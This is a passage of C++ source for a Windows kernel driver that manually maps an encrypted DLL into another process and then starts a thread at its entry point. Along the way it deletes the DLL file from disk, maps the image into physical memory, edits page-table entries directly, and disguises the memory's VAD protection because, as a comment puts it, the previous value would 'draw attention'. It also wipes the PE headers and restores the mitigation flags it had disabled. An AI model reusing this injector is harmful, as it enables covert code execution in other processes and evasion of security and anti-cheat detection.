	PUCHAR EncryptedDllMemory = nullptr, DecryptedDllMemory = nullptr;
	SIZE_T EncryptedDllFileSize = 0, DecryptedDllFileSize = 0;
	Status = RtlReadFileToBytes(DllNtPath,
								&EncryptedDllMemory,
								&EncryptedDllFileSize);
	if (!NT_SUCCESS(Status))
		goto finished;

	if (DeleteDll)
	{
		Printf("Deleting DLL file... \n");
		OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(DllNtPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE);
		Status = NtDeleteFile(&ObjectAttributes);
		if (!NT_SUCCESS(Status))
		{
			Printf("failure (NtDeleteFile error %08X). Aborting injection.\n", Status);
			goto finished;
		}
		Printf("done.\n");
	}

	// Decrypt the DLL if necessary. If the DLL is not encrypted, this is essentially a memcpy. Both buffers must be zeroed and freed.
	PIMAGE_NT_HEADERS NtHeaders;
	Status = DecryptPeFile(EncryptedDllMemory,
							EncryptedDllFileSize,
							&DecryptedDllMemory,
							&DecryptedDllFileSize,
							&NtHeaders);
	if (!NT_SUCCESS(Status))
	{
		Printf("Failed to decrypt DLL file: 0x%08X\n", Status);
		goto finished;
	}

	// Check PE target bitness
	if ((IsWow64 && NtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) ||
		(!IsWow64 && NtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64))
	{
		Printf("Error: wrong executable bitness (%u) for host process (%u).\n",
			NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386 ? 32 : 64,
			IsWow64 ? 32 : 64);
		Status = STATUS_INVALID_IMAGE_FORMAT;
		goto finished;
	}

	const PVOID HeadersImageBase = reinterpret_cast<PVOID>(HEADER_FIELD(NtHeaders, ImageBase));
	const SIZE_T HeadersSizeOfHeaders = static_cast<SIZE_T>(HEADER_FIELD(NtHeaders, SizeOfHeaders));
	SIZE_T HeadersSizeOfImage = static_cast<SIZE_T>(HEADER_FIELD(NtHeaders, SizeOfImage));
	const ULONG HeadersAddressOfEntryPoint = static_cast<ULONG>(HEADER_FIELD(NtHeaders, AddressOfEntryPoint));
	const PIMAGE_SECTION_HEADER SectionHeaders = reinterpret_cast<PIMAGE_SECTION_HEADER>(reinterpret_cast<PUCHAR>(NtHeaders) +
		sizeof(ULONG) + sizeof(IMAGE_FILE_HEADER) + NtHeaders->FileHeader.SizeOfOptionalHeader);

	// If the process is CSRSS, upgrade its WinSta0 handle to WINSTA_ALL_ACCESS and set it as the process window station
	BOOLEAN ProcessIsCsrss;
	Status = SetCSRSSWindowStation(Process, &ProcessIsCsrss);
	if (!NT_SUCCESS(Status))
		goto finished;

	if (!ProcessIsCsrss)
	{
		// Enable SeLoadDriverPrivilege for the process so that it can call NtUnloadDriver and unload this driver. We do not restore the privilege
		// to the old state here since we cannot know when user mode will be done with the privilege. Doing this is left to the user code.
		Status = RtlAdjustProcessPrivilege(Process,
										SE_LOAD_DRIVER_PRIVILEGE,
										TRUE);
		if (!NT_SUCCESS(Status))
		{
			Printf("Failed to enable SeLoadDriverPrivilege for target process: 0x%08X\n", Status);
			goto finished;
		}
	}

	// Randomise the image base by applying a form of pseudo-ASLR
	const PVOID RandomisedImageBase = RandomiseSystemImageBase(Process, NtHeaders);
	PVOID RemoteImageBase = RandomisedImageBase;

	// Attach to the process
	KAPC_STATE ApcState;
	KeStackAttachProcess(Process, &ApcState);
	Attached = true;

	// Allocate physical memory for the executable image
	BOOLEAN AllocatedPhysical = TRUE;
	Status = AllocatePhysicalMemory(&RemoteImageBase,
									HeadersSizeOfImage,
									PAGE_READWRITE);
	if (!NT_SUCCESS(Status))
	{
		// Failed to map physical memory - try virtual allocation
		AllocatedPhysical = FALSE;
		RemoteImageBase = RandomisedImageBase;
		Status = NtAllocateVirtualMemory(NtCurrentProcess(),
										&RemoteImageBase,
										0,
										&HeadersSizeOfImage,
										MEM_COMMIT | MEM_RESERVE,
										PAGE_READWRITE);
		if (Status == STATUS_CONFLICTING_ADDRESSES)
		{
			// Virtual address in use - pick any image base and relocate
			RemoteImageBase = nullptr;
			Status = NtAllocateVirtualMemory(NtCurrentProcess(),
											&RemoteImageBase,
											0,
											&HeadersSizeOfImage,
											MEM_COMMIT | MEM_RESERVE,
											PAGE_READWRITE);
		}
		if (!NT_SUCCESS(Status))
		{
			Printf("NtAllocateVirtualMemory: %08X\n", Status);
			goto finished;
		}
	}
	Printf("Allocated 0x%X bytes of %s memory in process at 0x%p.\n",
		static_cast<ULONG>(HeadersSizeOfImage), (AllocatedPhysical ? "PHYSICAL" : "VIRTUAL"), RemoteImageBase);

	// Check if the DLL needs to be relocated
	if (RemoteImageBase != HeadersImageBase)
	{
		Printf("Relocating image from 0x%p to 0x%p...\n", HeadersImageBase, RemoteImageBase);
		Status = LdrRelocateImageData(DecryptedDllMemory, RemoteImageBase);
		if (!NT_SUCCESS(Status))
		{
			Printf("Failed to relocate image: %08X\n", Status);
			goto finished;
		}

		// Update the image headers to reflect the new base address
		const PULONG_PTR ImageBaseRva = reinterpret_cast<PULONG_PTR>(IMAGE64(NtHeaders)
			? reinterpret_cast<ULONG_PTR>(&reinterpret_cast<PIMAGE_NT_HEADERS32>(NtHeaders)->OptionalHeader.ImageBase)
			: reinterpret_cast<ULONG_PTR>(&NtHeaders->OptionalHeader.ImageBase));
		if (IMAGE64(NtHeaders))
			*ImageBaseRva = reinterpret_cast<ULONG_PTR>(RemoteImageBase);
		else
			*reinterpret_cast<PULONG>(ImageBaseRva) = static_cast<ULONG>(reinterpret_cast<ULONG_PTR>(RemoteImageBase)); // Truncate to 32 bits
	}

	__try
	{
		// Write the DLL image headers
		RtlCopyMemory(RemoteImageBase, DecryptedDllMemory, HeadersSizeOfHeaders);
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		Status = GetExceptionCode();
		Printf("RtlCopyMemory exception %08X\n", Status);
		goto finished;
	}

	ULONG OldProtect;
	if (!WipeImageHeaders)
	{
		// Set the headers to read only, unless they will be wiped later
		if (AllocatedPhysical)
		{
			const PMMPTE PTE = GetPTEForVA(reinterpret_cast<PVOID>(RemoteImageBase));
			PTE->u.Hard.Dirty1 = PTE->u.Hard.Write = 0;
			PTE->u.Hard.NoExecute = 1;
		}
		else
		{
			PVOID HeaderPage = RemoteImageBase;
			SIZE_T HeaderSize = HeadersSizeOfHeaders;
			Status = NtProtectVirtualMemory(NtCurrentProcess(),
											&HeaderPage,
											&HeaderSize,
											PAGE_READONLY,
											&OldProtect);
			if (!NT_SUCCESS(Status))
			{
				Printf("NtProtectVirtualMemory (PE headers): %08X\n", Status);
				goto finished;
			}
		}
	}

	// Write PE sections of the relocated replacement executable to the process
	for (ULONG i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++)
	{
		// Skip invalid sections
		if (!(SectionHeaders[i].Characteristics & (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)) ||
			SectionHeaders[i].PointerToRawData == 0)
			continue;

		const PVOID SectionVa = static_cast<PVOID>(static_cast<PUCHAR>(RemoteImageBase) + SectionHeaders[i].VirtualAddress);
		const PVOID SectionData = static_cast<PVOID>(DecryptedDllMemory + SectionHeaders[i].PointerToRawData);

		__try
		{
			RtlCopyMemory(SectionVa, SectionData, SectionHeaders[i].SizeOfRawData);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			Status = GetExceptionCode();
			Printf("RtlCopyMemory (section %u/%u): exception %08X\n",
				(i + 1), NtHeaders->FileHeader.NumberOfSections, Status);
			goto finished;
		}
	}
	Printf("Wrote %u PE sections to process.\n\n", NtHeaders->FileHeader.NumberOfSections);

	// Resolve static imports and fill the IAT
	Status = ResolveImports(Process, RemoteImageBase, TRUE);
	if (!NT_SUCCESS(Status))
	{
		Printf("Failed to resolve imports for module; error %08X.\n", Status);
		goto finished;
	}

	Printf("Successfully resolved imports for module. \n", Status);

	if (AllocatedPhysical)
	{
		// Mark the VAD for the entire region as read/write. This only affects NtQueryVirtualMemory,
		// not the 'real' protection which is determined by the underlying PTEs. MM_ZERO_ACCESS is also possible
		// (BlackBone uses this value), but this gives an assert on checked kernels and has no added benefit.
		// This was previously MM_NOACCESS, but this seems to draw attention whereas R/W blends in with heap allocations.
		Status = ProtectVAD(Process, reinterpret_cast<ULONG_PTR>(RemoteImageBase), MM_READWRITE);
		if (!NT_SUCCESS(Status))
		{
			Printf("Failed to change VAD protection to MM_READWRITE; error %08X.\n", Status);
			goto finished;
		}
		Printf("Changed VAD protection to MM_READWRITE.\n");
	}

	// Set each section's page protection
	for (ULONG i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++)
	{
		if (!(SectionHeaders[i].Characteristics & (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)) ||
			SectionHeaders[i].PointerToRawData == 0)
			continue;

		// Ensure discardable sections are always writeable, because we will be wiping them later
		ULONG Characteristics = SectionHeaders[i].Characteristics;
		if ((Characteristics & IMAGE_SCN_MEM_DISCARDABLE) != 0)
			Characteristics |= IMAGE_SCN_MEM_WRITE;

		const ULONG Protection = CharacteristicsToPageProtection(Characteristics);
		SIZE_T SectionVirtualSize = SectionHeaders[i].Misc.VirtualSize > 0
			? SectionHeaders[i].Misc.VirtualSize
			: SectionHeaders[i].SizeOfRawData;
		PVOID SectionVa = static_cast<PVOID>(static_cast<PUCHAR>(RemoteImageBase) + SectionHeaders[i].VirtualAddress);

		if (AllocatedPhysical)
		{
			// NtProtectVirtualMemory cannot change the protection of physically mapped allocations.
			// Instead, set some primitive protections (read only, no execute) on the underlying PTEs
			SectionVa = reinterpret_cast<PVOID>(ROUND_TO_PAGES(SectionVa));

			for (ULONG_PTR Address = reinterpret_cast<ULONG_PTR>(SectionVa);
				Address < reinterpret_cast<ULONG_PTR>(SectionVa) + SectionVirtualSize;
				Address += PAGE_SIZE)
			{
				const PMMPTE PTE = GetPTEForVA(reinterpret_cast<PVOID>(Address));
				if ((Characteristics & IMAGE_SCN_MEM_WRITE) == 0)
					PTE->u.Hard.Dirty1 = PTE->u.Hard.Write = 0; // Read only
				if ((Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0)
					PTE->u.Hard.NoExecute = 0; // Executable
				else
					PTE->u.Hard.NoExecute = 1; // Not executable
			}
		}
		else if (Protection != PAGE_NOACCESS)
		{
			// Virtually allocated region - set page protection
			Status = NtProtectVirtualMemory(NtCurrentProcess(),
											&SectionVa,
											&SectionVirtualSize,
											Protection,
											&OldProtect);
			if (!NT_SUCCESS(Status))
			{
				Printf("NtProtectVirtualMemory (section %u/%u): %08X\n",
					(i + 1), NtHeaders->FileHeader.NumberOfSections, Status);
				goto finished;
			}
		}
		else
		{
			// Virtually allocated PAGE_NOACCESS region - decommit
			NtFreeVirtualMemory(NtCurrentProcess(),
								&SectionVa,
								&SectionVirtualSize,
								MEM_DECOMMIT);
		}
	}

	// Start the DLL initializer thread
	Status = StartDllThread(RemoteImageBase,
							HeadersAddressOfEntryPoint,
							IsWow64);
	if (!NT_SUCCESS(Status))
		goto finished;

	// Wipe discardable sections and optionally the PE image headers
	WipeImageSections(RemoteImageBase,
						AllocatedPhysical,
						SectionHeaders,
						WipeImageHeaders);

finished:
	if (Attached)
		KeUnstackDetachProcess(&ApcState);

	if (DecryptedDllMemory != nullptr)
	{
		// Wipe the DLL file buffer before freeing it
		RtlFillGarbageMemory(DecryptedDllMemory, DecryptedDllFileSize);
		ExFreePool(DecryptedDllMemory);
	}

	if (EncryptedDllMemory != nullptr)
	{
		RtlFillGarbageMemory(EncryptedDllMemory, EncryptedDllFileSize);
		ExFreePool(EncryptedDllMemory);
	}

	if (DynData.Version >= WINVER_10_RS4 && RestrictSetThreadContext)
	{
		reinterpret_cast<PEPROCESS_FLAGS2_RS4_PLUS>(Flags2)->RestrictSetThreadContext = 1;
		Printf("Restored SetThreadContext restriction.\n");
	}

	if (DynData.Version >= WINVER_81 && DisableDynamicCode)
	{
		if (DynData.Version <= WINVER_10_RS2)
			Flags2->DisableDynamicCode = 1;
		else
			MitigationFlags->DisableDynamicCode = 1;
		Printf("Restored dynamic code restriction.\n");
	}

	if (Process != nullptr)
		ObfDereferenceObject(Process);

	if (NT_SUCCESS(Status))
		Printf("DLL injection successful.\n");

	return Status;
}
